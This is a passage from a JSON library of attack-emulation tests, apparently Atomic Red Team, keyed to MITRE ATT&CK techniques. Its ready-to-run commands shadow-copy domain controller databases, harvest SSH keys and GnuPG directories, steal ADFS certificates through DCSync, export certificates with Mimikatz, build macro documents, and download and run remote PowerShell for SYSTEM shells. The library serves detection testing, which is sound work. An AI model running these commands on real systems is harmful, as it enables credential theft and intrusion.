		"attack_technique": "T1003.003",
		"phases": ["credential-access"]
	},
	{
		"name": "Create Volume Shadow Copy with WMI",
		"auto_generated_guid": "224f7de0-8f0a-4a94-b5d8-989b036c86da",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"drive_letter": {
				"description": "Drive letter to source VSC (including colon and backslash)",
				"type": "string",
				"default": "C:\\"
			}
		},
		"dependencies": [
			{
				"description": "Target must be a Domain Controller\n",
				"prereq_command": "reg query HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\ProductOptions  /v ProductType | findstr LanmanNT\n",
				"get_prereq_command": "echo Sorry, Promoting this machine to a Domain Controller must be done manually\n"
			}
		],
		"executor": {
			"command": "wmic shadowcopy call create Volume=#{drive_letter}\n",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1003.003",
		"phases": ["credential-access"]
	},
	{
		"name": "Create Volume Shadow Copy remotely with WMI",
		"auto_generated_guid": "d893459f-71f0-484d-9808-ec83b2b64226",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"drive_letter": {
				"description": "Drive letter to source VSC (including colon and backslash)",
				"type": "string",
				"default": "C:\\"
			},
			"target_host": {
				"description": "IP Address / Hostname you want to target",
				"type": "string",
				"default": "localhost"
			}
		},
		"dependencies": [
			{
				"description": "Target must be a reachable Domain Controller, and current context must be domain admin\n",
				"prereq_command": "wmic /node:\"#{target_host}\" shadowcopy list brief\n",
				"get_prereq_command": "echo Sorry, can't connect to target host, check: network, firewall or permissions (must be admin on target)\n"
			}
		],
		"executor": {
			"command": "wmic /node:\"#{target_host}\" shadowcopy call create Volume=#{drive_letter}\n",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1003.003",
		"phases": ["credential-access"]
	},
	{
		"name": "Create Volume Shadow Copy remotely (WMI) with esentutl",
		"auto_generated_guid": "21c7bf80-3e8b-40fa-8f9d-f5b194ff2865",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"source_path": {
				"description": "File to shadow copy",
				"type": "string",
				"default": "c:\\windows\\ntds\\ntds.dit"
			},
			"target_path": {
				"description": "Target path of the result file",
				"type": "string",
				"default": "c:\\ntds.dit"
			},
			"target_host": {
				"description": "IP Address / Hostname you want to target",
				"type": "string",
				"default": "localhost"
			}
		},
		"dependencies": [
			{
				"description": "Target must be a reachable Domain Controller, and current context must be domain admin\n",
				"prereq_command": "wmic /node:\"#{target_host}\" shadowcopy list brief\n",
				"get_prereq_command": "echo Sorry, can't connect to target host, check: network, firewall or permissions (must be admin on target)\n"
			}
		],
		"executor": {
			"command": "wmic /node:\"#{target_host}\" process call create \"cmd.exe /c esentutl.exe /y /vss #{source_path} /d #{target_path}\"\n",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1003.003",
		"phases": ["credential-access"]
	},
	{
		"name": "Create Volume Shadow Copy with Powershell",
		"auto_generated_guid": "542bb97e-da53-436b-8e43-e0a7d31a6c24",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"drive_letter": {
				"description": "Drive letter to source VSC (including colon)",
				"type": "string",
				"default": "C:\\"
			}
		},
		"executor": {
			"command": "(gwmi -list win32_shadowcopy).Create('#{drive_letter}','ClientAccessible')\n",
			"name": "powershell",
			"elevation_required": true
		},
		"attack_technique": "T1003.003",
		"phases": ["credential-access"]
	},
	{
		"name": "Create Symlink to Volume Shadow Copy",
		"auto_generated_guid": "21748c28-2793-4284-9e07-d6d028b66702",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"drive_letter": {
				"description": "Drive letter to source VSC (including colon)",
				"type": "string",
				"default": "C:"
			},
			"symlink_path": {
				"description": "symlink path",
				"type": "string",
				"default": "C:\\Temp\\vssstore"
			}
		},
		"executor": {
			"command": "vssadmin.exe create shadow /for=#{drive_letter}\nmklink /D #{symlink_path} \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\n",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1003.003",
		"phases": ["credential-access"]
	},
	{
		"name": "Create Volume Shadow Copy with diskshadow",
		"auto_generated_guid": "b385996c-0e7d-4e27-95a4-aca046b119a7",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"filename": {
				"description": "Location of the script",
				"type": "Path",
				"default": "PathToAtomicsFolder\\T1003.003\\src\\diskshadow.txt"
			}
		},
		"executor": {
			"command": "mkdir c:\\exfil\ndiskshadow.exe /s #{filename}\n",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1003.003",
		"phases": ["credential-access"]
	},
	{
		"name": "Execution through API - CreateProcess",
		"auto_generated_guid": "99be2089-c52d-4a4a-b5c3-261ee42c8b62",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"source_file": {
				"description": "Location of the CSharp source file to compile and execute",
				"type": "path",
				"default": "PathToAtomicsFolder\\T1106\\src\\CreateProcess.cs"
			},
			"output_file": {
				"description": "Location of the payload",
				"type": "path",
				"default": "%tmp%\\T1106.exe"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "#{source_file} must exist on system.\n",
				"prereq_command": "if (Test-Path \"#{source_file}\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory (split-path \"#{source_file}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1106/src/CreateProcess.cs\" -OutFile \"#{source_file}\"\n"
			}
		],
		"executor": {
			"command": "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe /out:\"#{output_file}\" /target:exe \"#{source_file}\"\n%tmp%/T1106.exe\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1106",
		"phases": ["execution"]
	},
	{
		"name": "WinPwn - Get SYSTEM shell - Pop System Shell using CreateProcess technique",
		"auto_generated_guid": "ce4e76e6-de70-4392-9efe-b281fc2b4087",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/CreateProcess/Get-CreateProcessSystem.ps1')",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1106",
		"phases": ["execution"]
	},
	{
		"name": "WinPwn - Get SYSTEM shell - Bind System Shell using CreateProcess technique",
		"auto_generated_guid": "7ec5b74e-8289-4ff2-a162-b6f286a33abd",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/CreateProcess/Get-CreateProcessSystemBind.ps1')",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1106",
		"phases": ["execution"]
	},
	{
		"name": "WinPwn - Get SYSTEM shell - Pop System Shell using NamedPipe Impersonation technique",
		"auto_generated_guid": "e1f93a06-1649-4f07-89a8-f57279a7d60e",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/NamedPipe/NamedPipeSystem.ps1')",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1106",
		"phases": ["execution"]
	},
	{
		"name": "Run Shellcode via Syscall in Go",
		"auto_generated_guid": "ae56083f-28d0-417d-84da-df4242da1f7c",
		"supported_platforms": ["windows"],
		"executor": {
			"name": "powershell",
			"elevation_required": false,
			"command": "$PathToAtomicsFolder\\T1106\\bin\\x64\\syscall.exe -debug\n",
			"cleanup_command": "Stop-Process -Name CalculatorApp -ErrorAction SilentlyContinue"
		},
		"attack_technique": "T1106",
		"phases": ["execution"]
	},
	{
		"name": "ExecIntoContainer",
		"auto_generated_guid": "d03bfcd3-ed87-49c8-8880-44bb772dea4b",
		"supported_platforms": ["containers"],
		"input_arguments": {
			"namespace": {
				"description": "K8s namespace to use",
				"type": "string",
				"default": "default"
			},
			"command": {
				"description": "Command to run",
				"type": "string",
				"default": "uname"
			},
			"path": {
				"description": "Path to busybox.yaml file",
				"type": "string",
				"default": "$PathtoAtomicsFolder/T1609/src/busybox.yaml"
			}
		},
		"dependencies": [
			{
				"description": "kubectl must be installed\n",
				"get_prereq_command": "echo \"kubectl must be installed manually\"\n",
				"prereq_command": "which kubectl\n"
			}
		],
		"executor": {
			"command": "kubectl create -f #{path} -n #{namespace}\n# wait 3 seconds for the instance to come up\nsleep 3\nkubectl exec -n #{namespace} busybox -- #{command}\n",
			"cleanup_command": "kubectl delete pod busybox -n #{namespace}\n",
			"name": "bash",
			"elevation_required": false
		},
		"attack_technique": "T1609",
		"phases": ["execution"]
	},
	{
		"name": "Docker Exec Into Container",
		"auto_generated_guid": "900e2c49-221b-42ec-ae3c-4717e41e6219",
		"supported_platforms": ["containers"],
		"dependencies": [
			{
				"description": "docker must be installed\n",
				"get_prereq_command": "if [ \"\" == \"`which docker`\" ]; then echo \"Docker Not Found\"; if [ -n \"`which apt-get`\" ]; then sudo apt-get -y install docker ; elif [ -n \"`which yum`\" ]; then sudo yum -y install docker ; fi ; else echo \"Docker installed\"; fi\n",
				"prereq_command": "which docker\n"
			}
		],
		"executor": {
			"command": "docker build -t t1609  $PathtoAtomicsFolder/T1609/src/ \ndocker run --name t1609_container --rm -itd t1609 bash /tmp/script.sh\ndocker exec -i t1609_container bash -c \"cat /tmp/output.txt\"\n",
			"cleanup_command": "docker stop t1609_container\ndocker rmi -f t1609:latest \n",
			"name": "bash",
			"elevation_required": false
		},
		"attack_technique": "T1609",
		"phases": ["execution"]
	},
	{
		"name": "Private Keys",
		"auto_generated_guid": "520ce462-7ca7-441e-b5a5-f8347f632696",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "dir c:\\ /b /s .key | findstr /e .key\n",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1552.004",
		"phases": ["credential-access"]
	},
	{
		"name": "Discover Private SSH Keys",
		"auto_generated_guid": "46959285-906d-40fa-9437-5a439accd878",
		"supported_platforms": ["linux", "macos"],
		"input_arguments": {
			"search_path": {
				"description": "Path where to start searching from.",
				"type": "path",
				"default": "/"
			},
			"output_file": {
				"description": "Output file containing locations of SSH key files",
				"type": "path",
				"default": "/tmp/keyfile_locations.txt"
			}
		},
		"executor": {
			"command": "find #{search_path} -name id_rsa 2>/dev/null >> #{output_file}\nexit 0\n",
			"cleanup_command": "rm #{output_file}\n",
			"name": "sh",
			"elevation_required": false
		},
		"attack_technique": "T1552.004",
		"phases": ["credential-access"]
	},
	{
		"name": "Copy Private SSH Keys with CP",
		"auto_generated_guid": "7c247dc7-5128-4643-907b-73a76d9135c3",
		"supported_platforms": ["linux"],
		"input_arguments": {
			"search_path": {
				"description": "Path where to start searching from.",
				"type": "path",
				"default": "/"
			},
			"output_folder": {
				"description": "Output folder containing copies of SSH private key files",
				"type": "path",
				"default": "/tmp/art-staging"
			}
		},
		"executor": {
			"command": "mkdir #{output_folder}\nfind #{search_path} -name id_rsa 2>/dev/null -exec cp --parents {} #{output_folder} \\;\nexit 0\n",
			"cleanup_command": "rm -rf #{output_folder}\n",
			"name": "sh",
			"elevation_required": false
		},
		"attack_technique": "T1552.004",
		"phases": ["credential-access"]
	},
	{
		"name": "Copy Private SSH Keys with CP (freebsd)",
		"auto_generated_guid": "12e4a260-a7fd-4ed8-bf18-1a28c1395775",
		"supported_platforms": ["linux"],
		"input_arguments": {
			"search_path": {
				"description": "Path where to start searching from.",
				"type": "path",
				"default": "/"
			},
			"output_folder": {
				"description": "Output folder containing copies of SSH private key files",
				"type": "path",
				"default": "/tmp/art-staging"
			}
		},
		"dependency_executor_name": "sh",
		"dependencies": [
			{
				"description": "Install GNU cp from coreutils package.\n",
				"prereq_command": "if [ ! -x \"$(command -v gcp)\" ]; then exit 1; else exit 0; fi;\n",
				"get_prereq_command": "(which pkg && pkg install -y coreutils)\n"
			}
		],
		"executor": {
			"command": "mkdir #{output_folder}\nfind #{search_path} -name id_rsa 2>/dev/null -exec gcp --parents {} #{output_folder} \\;\n",
			"cleanup_command": "rm -rf #{output_folder}\n",
			"name": "sh",
			"elevation_required": false
		},
		"attack_technique": "T1552.004",
		"phases": ["credential-access"]
	},
	{
		"name": "Copy Private SSH Keys with rsync",
		"auto_generated_guid": "864bb0b2-6bb5-489a-b43b-a77b3a16d68a",
		"supported_platforms": ["macos", "linux"],
		"input_arguments": {
			"search_path": {
				"description": "Path where to start searching from.",
				"type": "path",
				"default": "/"
			},
			"output_folder": {
				"description": "Output folder containing copies of SSH private key files",
				"type": "path",
				"default": "/tmp/art-staging"
			}
		},
		"executor": {
			"command": "mkdir #{output_folder}\nfind #{search_path} -name id_rsa 2>/dev/null -exec rsync -R {} #{output_folder} \\;\nexit 0\n",
			"cleanup_command": "rm -rf #{output_folder}\n",
			"name": "sh",
			"elevation_required": false
		},
		"attack_technique": "T1552.004",
		"phases": ["credential-access"]
	},
	{
		"name": "Copy Private SSH Keys with rsync (freebsd)",
		"auto_generated_guid": "922b1080-0b95-42b0-9585-b9a5ea0af044",
		"supported_platforms": ["linux"],
		"input_arguments": {
			"search_path": {
				"description": "Path where to start searching from.",
				"type": "path",
				"default": "/"
			},
			"output_folder": {
				"description": "Output folder containing copies of SSH private key files",
				"type": "path",
				"default": "/tmp/art-staging"
			}
		},
		"dependency_executor_name": "sh",
		"dependencies": [
			{
				"description": "Check if rsync is installed.\n",
				"prereq_command": "if [ ! -x \"$(command -v rsync)\" ]; then exit 1; else exit 0; fi;\n",
				"get_prereq_command": "(which pkg && pkg install -y rsync)\n"
			}
		],
		"executor": {
			"command": "mkdir #{output_folder}\nfind #{search_path} -name id_rsa 2>/dev/null -exec rsync -R {} #{output_folder} \\;\n",
			"cleanup_command": "rm -rf #{output_folder}\n",
			"name": "sh",
			"elevation_required": false
		},
		"attack_technique": "T1552.004",
		"phases": ["credential-access"]
	},
	{
		"name": "Copy the users GnuPG directory with rsync",
		"auto_generated_guid": "2a5a0601-f5fb-4e2e-aa09-73282ae6afca",
		"supported_platforms": ["macos", "linux"],
		"input_arguments": {
			"search_path": {
				"description": "Path where to start searching from",
				"type": "path",
				"default": "/"
			},
			"output_folder": {
				"description": "Output folder containing a copy of the .gnupg directory",
				"type": "path",
				"default": "/tmp/GnuPG"
			}
		},
		"executor": {
			"command": "mkdir #{output_folder}\nfind #{search_path} -type d -name '.gnupg' 2>/dev/null -exec rsync -Rr {} #{output_folder} \\;\nexit 0\n",
			"cleanup_command": "rm -rf #{output_folder}\n",
			"name": "sh",
			"elevation_required": false
		},
		"attack_technique": "T1552.004",
		"phases": ["credential-access"]
	},
	{
		"name": "Copy the users GnuPG directory with rsync (freebsd)",
		"auto_generated_guid": "b05ac39b-515f-48e9-88e9-2f141b5bcad0",
		"supported_platforms": ["linux"],
		"input_arguments": {
			"search_path": {
				"description": "Path where to start searching from",
				"type": "path",
				"default": "/"
			},
			"output_folder": {
				"description": "Output folder containing a copy of the .gnupg directory",
				"type": "path",
				"default": "/tmp/GnuPG"
			}
		},
		"dependency_executor_name": "sh",
		"dependencies": [
			{
				"description": "Check if rsync is installed.\n",
				"prereq_command": "if [ ! -x \"$(command -v rsync)\" ]; then exit 1; else exit 0; fi;\n",
				"get_prereq_command": "(which pkg && pkg install -y rsync)\n"
			}
		],
		"executor": {
			"command": "mkdir #{output_folder}\nfind #{search_path} -type d -name '.gnupg' 2>/dev/null -exec rsync -Rr {} #{output_folder} \\;\n",
			"cleanup_command": "rm -rf #{output_folder}\n",
			"name": "sh",
			"elevation_required": false
		},
		"attack_technique": "T1552.004",
		"phases": ["credential-access"]
	},
	{
		"name": "ADFS token signing and encryption certificates theft - Local",
		"auto_generated_guid": "78e95057-d429-4e66-8f82-0f060c1ac96f",
		"supported_platforms": ["windows"],
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "AADInternals module must be installed.\n",
				"prereq_command": "if (Get-Module AADInternals) {exit 0} else {exit 1}\n",
				"get_prereq_command": "Install-Module -Name AADInternals -Force\n"
			}
		],
		"executor": {
			"command": "Import-Module AADInternals -Force\nExport-AADIntADFSCertificates\nGet-ChildItem | Where-Object {$_ -like \"ADFS*\"}\nWrite-Host \"`nCertificates retrieved successfully\"\n",
			"cleanup_command": "Remove-Item -Path \".\\ADFS_encryption.pfx\" -ErrorAction Ignore\nRemove-Item -Path \".\\ADFS_signing.pfx\" -ErrorAction Ignore\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1552.004",
		"phases": ["credential-access"]
	},
	{
		"name": "ADFS token signing and encryption certificates theft - Remote",
		"auto_generated_guid": "cab413d8-9e4a-4b8d-9b84-c985bd73a442",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"adfs_service_account_name": {
				"description": "Name of the ADFS service account",
				"type": "string",
				"default": "adfs_svc"
			},
			"replication_user": {
				"description": "Username with replication rights. It can be the Domain Admin running the script",
				"type": "string",
				"default": "Administrator"
			},
			"replication_password": {
				"description": "Password of replication_username",
				"type": "string",
				"default": "ReallyStrongPassword"
			},
			"adfs_server_name": {
				"description": "Name of an ADFS server",
				"type": "string",
				"default": "sts.contoso.com"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "AADInternals and ActiveDirectory modules must be installed.\n",
				"prereq_command": "if ($(Get-Module AADInternals) -or $(Get-Module -ListAvailable -Name ActiveDirectory)) {echo 0} else {echo 1}\n",
				"get_prereq_command": "Install-Module -Name AADInternals -Force\n"
			}
		],
		"executor": {
			"command": "Import-Module ActiveDirectory -Force \nImport-Module AADInternals -Force | Out-Null\n#Get Configuration\n$dcServerName = (Get-ADDomainController).HostName\n$svc = Get-ADObject -filter * -Properties objectguid,objectsid | Where-Object name -eq \"#{adfs_service_account_name}\"\n$PWord = ConvertTo-SecureString -String \"#{replication_password}\" -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList #{replication_user}, $PWord\n# use DCSync to fetch the ADFS service account's NT hash\n$hash = Get-AADIntADUserNTHash -ObjectGuid $svc.ObjectGuid -Credentials $Credential -Server $dcServerName -AsHex\n$ADFSConfig = Export-AADIntADFSConfiguration -Hash $hash -SID $svc.Objectsid.Value -Server #{adfs_server_name}\n# Get certificates decryption key\n$Configuration = [xml]$ADFSConfig\n$group = $Configuration.ServiceSettingsData.PolicyStore.DkmSettings.Group\n$container = $Configuration.ServiceSettingsData.PolicyStore.DkmSettings.ContainerName\n$parent = $Configuration.ServiceSettingsData.PolicyStore.DkmSettings.ParentContainerDn\n$base = \"LDAP://CN=$group,$container,$parent\"\n$ADSearch = [System.DirectoryServices.DirectorySearcher]::new([System.DirectoryServices.DirectoryEntry]::new($base))\n$ADSearch.Filter = '(name=CryptoPolicy)'\n$ADSearch.PropertiesToLoad.Clear()\n$ADSearch.PropertiesToLoad.Add(\"displayName\") | Out-Null\n$aduser = $ADSearch.FindOne()\n$keyObjectGuid = $ADUser.Properties[\"displayName\"] \n$ADSearch.PropertiesToLoad.Clear()\n$ADSearch.PropertiesToLoad.Add(\"thumbnailphoto\") | Out-Null\n$ADSearch.Filter=\"(l=$keyObjectGuid)\"\n$aduser=$ADSearch.FindOne() \n$key=[byte[]]$aduser.Properties[\"thumbnailphoto\"][0] \n# Get encrypted certificates from configuration and decrypt them\nExport-AADIntADFSCertificates -Configuration $ADFSConfig -Key $key\nGet-ChildItem | Where-Object {$_ -like \"ADFS*\"}\nWrite-Host \"`nCertificates retrieved successfully\"\n",
			"cleanup_command": "Remove-Item -Path \".\\ADFS_encryption.pfx\" -ErrorAction Ignore\nRemove-Item -Path \".\\ADFS_signing.pfx\" -ErrorAction Ignore\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1552.004",
		"phases": ["credential-access"]
	},
	{
		"name": "CertUtil ExportPFX",
		"auto_generated_guid": "336b25bf-4514-4684-8924-474974f28137",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"output": {
				"description": "file path to export to",
				"type": "path",
				"default": "c:\\temp\\atomic.pfx"
			},
			"password": {
				"description": "password for cert",
				"type": "string",
				"default": "password"
			}
		},
		"executor": {
			"command": "IEX (IWR 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1553.004/src/RemoteCertTrust.ps1' -UseBasicParsing) \ncertutil.exe -p #{password} -exportPFX Root 1F3D38F280635F275BE92B87CF83E40E40458400 #{output}\n",
			"cleanup_command": "Get-ChildItem -Path Cert:\\ -Recurse | Where-Object { $_.Thumbprint -eq '1F3D38F280635F275BE92B87CF83E40E40458400' } | remove-item \n",
			"name": "powershell",
			"elevation_required": true
		},
		"attack_technique": "T1552.004",
		"phases": ["credential-access"]
	},
	{
		"name": "Export Root Certificate with Export-PFXCertificate",
		"auto_generated_guid": "7617f689-bbd8-44bc-adcd-6f8968897848",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"pfx_path": {
				"description": "output path of the certificate",
				"type": "string",
				"default": "$env:Temp\\atomicredteam.pfx"
			}
		},
		"executor": {
			"command": "$mypwd = ConvertTo-SecureString -String \"AtomicRedTeam\" -Force -AsPlainText\n$cert = New-SelfSignedCertificate -DnsName atomicredteam.com -CertStoreLocation cert:\\LocalMachine\\My\nSet-Location Cert:\\LocalMachine\\My\nGet-ChildItem -Path $cert.Thumbprint | Export-PfxCertificate -FilePath #{pfx_path} -Password $mypwd\n",
			"cleanup_command": "try {\n$cert = Import-Certificate -FilePath #{pfx_path} -CertStoreLocation Cert:\\LocalMachine\\My\nGet-ChildItem Cert:\\LocalMachine\\My\\$($cert.Thumbprint) -ErrorAction Ignore | Remove-Item -ErrorAction Ignore\nGet-ChildItem Cert:\\LocalMachine\\Root\\$($cert.Thumbprint) -ErrorAction Ignore | Remove-Item -ErrorAction Ignore\n} catch { }\n",
			"name": "powershell",
			"elevation_required": true
		},
		"attack_technique": "T1552.004",
		"phases": ["credential-access"]
	},
	{
		"name": "Export Root Certificate with Export-Certificate",
		"auto_generated_guid": "78b274f8-acb0-428b-b1f7-7b0d0e73330a",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"pfx_path": {
				"description": "Path of the certificate",
				"type": "path",
				"default": "$env:Temp\\AtomicRedTeam.cer"
			}
		},
		"executor": {
			"command": "$cert = New-SelfSignedCertificate -DnsName atomicredteam.com -CertStoreLocation cert:\\LocalMachine\\My\nSet-Location Cert:\\LocalMachine\\My\nExport-Certificate -Type CERT -Cert  Cert:\\LocalMachine\\My\\$($cert.Thumbprint) -FilePath #{pfx_path}\n",
			"cleanup_command": "try {\n   $cert = Import-Certificate -FilePath #{pfx_path} -CertStoreLocation Cert:\\LocalMachine\\My -ErrorAction Ignore\n   Get-ChildItem Cert:\\LocalMachine\\My\\$($cert.Thumbprint) -ErrorAction Ignore | Remove-Item -ErrorAction Ignore\n   Get-ChildItem Cert:\\LocalMachine\\Root\\$($cert.Thumbprint) -ErrorAction Ignore | Remove-Item -ErrorAction Ignore\n}\ncatch { }\n",
			"name": "powershell",
			"elevation_required": true
		},
		"attack_technique": "T1552.004",
		"phases": ["credential-access"]
	},
	{
		"name": "Export Certificates with Mimikatz",
		"auto_generated_guid": "290df60e-4b5d-4a5e-b0c7-dc5348ea0c86",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"mimikatz_exe": {
				"description": "Path of the Mimikatz binary",
				"type": "string",
				"default": "PathToAtomicsFolder\\..\\ExternalPayloads\\x64\\mimikatz.exe"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "Mimikatz must exist on disk at specified location (#{mimikatz_exe})\n",
				"prereq_command": "if (Test-Path \"#{mimikatz_exe}\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-FetchFromZip.ps1\" -UseBasicParsing) \n$releases = \"https://api.github.com/repos/gentilkiwi/mimikatz/releases\"\n$zipUrl = (Invoke-WebRequest $releases | ConvertFrom-Json)[0].assets.browser_download_url | where-object { $_.endswith(\".zip\") }\n$basePath = Split-Path \"#{mimikatz_exe}\" | Split-Path\nInvoke-FetchFromZip $zipUrl \"x64/mimikatz.exe\" $basePath\n"
			}
		],
		"executor": {
			"command": "\"#{mimikatz_exe}\" \"crypto::certificates /systemstore:local_machine /store:my /export\"  exit\n",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1552.004",
		"phases": ["credential-access"]
	},
	{
		"name": "OSTap Style Macro Execution",
		"auto_generated_guid": "8bebc690-18c7-4549-bc98-210f7019efff",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"jse_path": {
				"description": "Path for the macro to write out the \"malicious\" .jse file\n",
				"type": "string",
				"default": "C:\\Users\\Public\\art.jse"
			},
			"ms_product": {
				"description": "Maldoc application Word or Excel",
				"type": "string",
				"default": "Word"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "Microsoft #{ms_product} must be installed\n",
				"prereq_command": "try {\n  New-Object -COMObject \"#{ms_product}.Application\" | Out-Null\n  $process = \"#{ms_product}\"; if ( $process -eq \"Word\") {$process = \"winword\"}\n  Stop-Process -Name $process\n  exit 0\n} catch { exit 1 }\n",
				"get_prereq_command": "Write-Host \"You will need to install Microsoft #{ms_product} manually to meet this requirement\"\n"
			}
		],
		"executor": {
			"command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing)\n$macrocode = \"   Open `\"#{jse_path}`\" For Output As #1`n   Write #1, `\"WScript.Quit`\"`n   Close #1`n   Shell`$ `\"cscript.exe #{jse_path}`\"`n\"\nInvoke-MalDoc -macroCode $macrocode -officeProduct \"#{ms_product}\"\n",
			"cleanup_command": "Remove-Item #{jse_path} -ErrorAction Ignore\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1204.002",
		"phases": ["execution"]
	},
	{
		"name": "OSTap Payload Download",
		"auto_generated_guid": "3f3af983-118a-4fa1-85d3-ba4daa739d80",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"script_file": {
				"description": "File to execute jscript code from",
				"type": "path",
				"default": "%TEMP%\\OSTapGet.js"
			},
			"file_url": {
				"description": "URL to retrieve file from",
				"type": "url",
				"default": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt"
			}
		},
		"executor": {
			"command": "echo var url = \"#{file_url}\", fso = WScript.CreateObject('Scripting.FileSystemObject'), request, stream; request = WScript.CreateObject('MSXML2.ServerXMLHTTP'); request.open('GET', url, false); request.send(); if (request.status === 200) {stream = WScript.CreateObject('ADODB.Stream'); stream.Open(); stream.Type = 1; stream.Write(request.responseBody); stream.Position = 0; stream.SaveToFile('ostapout.txt', 1); stream.Close();} else {WScript.Quit(1);}WScript.Quit(0); > #{script_file}\ncscript //E:Jscript #{script_file}\n",
			"cleanup_command": "del #{script_file} /F /Q >nul 2>&1\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1204.002",
		"phases": ["execution"]
	},
	{
		"name": "Maldoc choice flags command execution",
		"auto_generated_guid": "0330a5d2-a45a-4272-a9ee-e364411c4b18",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"ms_product": {
				"description": "Maldoc application Word or Excel",
				"type": "string",
				"default": "Word"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "Microsoft #{ms_product} must be installed\n",
				"prereq_command": "try {\n  New-Object -COMObject \"#{ms_product}.Application\" | Out-Null\n  $process = \"#{ms_product}\"; if ( $process -eq \"Word\") {$process = \"winword\"}\n  Stop-Process -Name $process\n  exit 0\n} catch { exit 1 }\n",
				"get_prereq_command": "Write-Host \"You will need to install Microsoft #{ms_product} manually to meet this requirement\"\n"
			}
		],
		"executor": {
			"command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing)\n$macrocode = \"  a = Shell(`\"cmd.exe /c choice /C Y /N /D Y /T 3`\", vbNormalFocus)\"\nInvoke-MalDoc -macroCode $macrocode -officeProduct \"#{ms_product}\"\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1204.002",
		"phases": ["execution"]
	},
	{
		"name": "OSTAP JS version",
		"auto_generated_guid": "add560ef-20d6-4011-a937-2c340f930911",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"jse_path": {
				"description": "jse file to execute with wscript",
				"type": "path",
				"default": "C:\\Users\\Public\\art.jse"
			},
			"ms_product": {
				"description": "Maldoc application Word or Excel",
				"type": "string",
				"default": "Word"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "Microsoft #{ms_product} must be installed\n",
				"prereq_command": "try {\n  New-Object -COMObject \"#{ms_product}.Application\" | Out-Null\n  $process = \"#{ms_product}\"; if ( $process -eq \"Word\") {$process = \"winword\"}\n  Stop-Process -Name $process\n  exit 0\n} catch { exit 1 }\n",
				"get_prereq_command": "Write-Host \"You will need to install Microsoft #{ms_product} manually to meet this requirement\"\n"
			}
		],
		"executor": {
